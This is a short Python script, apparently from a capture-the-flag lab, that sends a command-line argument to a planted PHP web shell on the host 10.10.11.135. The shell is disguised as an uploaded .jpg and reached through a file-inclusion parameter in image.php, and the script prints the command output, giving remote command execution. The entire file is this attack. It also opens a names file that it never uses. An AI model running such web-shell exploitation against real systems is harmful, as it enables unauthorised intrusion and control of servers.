import requests
import sys

cmd = sys.argv[1]
hash = "fb60a17ece46feebb5a47e91db3b1b3b"  # got from test_names.py

names_file = open("names.txt", 'r')
names = names_file.read().splitlines()

base_url = 'http://10.10.11.135/image.php?img=images/uploads/{}_debug.php.jpg&cmd={}'
url = base_url.format(hash, cmd)
response = requests.get(url)
print(response.text)
